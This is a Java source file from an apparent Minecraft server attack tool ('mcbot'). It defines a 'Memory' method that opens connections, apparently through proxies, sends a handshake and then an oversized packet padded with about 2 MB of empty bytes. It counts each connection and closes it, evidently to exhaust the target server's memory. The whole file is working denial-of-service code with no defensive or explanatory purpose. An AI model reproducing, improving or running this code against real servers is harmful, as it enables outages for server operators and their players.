package xyz.mcbot.methods;

import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.io.IOException;
import xyz.mcbot.Main;
import xyz.mcbot.NettyBootstrap;
import xyz.mcbot.ProxyLoader.Proxy;
import xyz.mcbot.minecraftutils.Handshake;

public class Memory implements Method
{
  private Handshake handshake;
  private byte[] bytes;
  byte[] emptyarray;
  
  public Memory()
  {
    handshake = new Handshake(Main.protcolID, Main.srvRecord, Main.port, 2);
    bytes = handshake.getWrappedPacket();
    
    emptyarray = new byte[2097150];
  }
  
  public static void writeVarInt(ByteBufOutputStream out, int paramInt) throws IOException {
    while ((paramInt & 0xFFFFFF80) != 0) {
      out.writeByte(paramInt & 0x7F | 0x80);
      paramInt >>>= 7;
    }
    out.writeByte(paramInt);
  }
  
  public void accept(Channel channel, ProxyLoader.Proxy proxy)
  {
    channel.write(Unpooled.buffer().writeBytes(bytes));
    ByteBuf b = Unpooled.buffer();
    ByteBufOutputStream out = new ByteBufOutputStream(b);
    try {
      writeVarInt(out, 2097151);
      out.write(emptyarray);
      out.close();
    }
    catch (IOException e) {
      e.printStackTrace();
    }
    channel.writeAndFlush(b);
    NettyBootstrap.integer += 1;
    NettyBootstrap.totalConnections += 1;
    channel.close();
  }
}
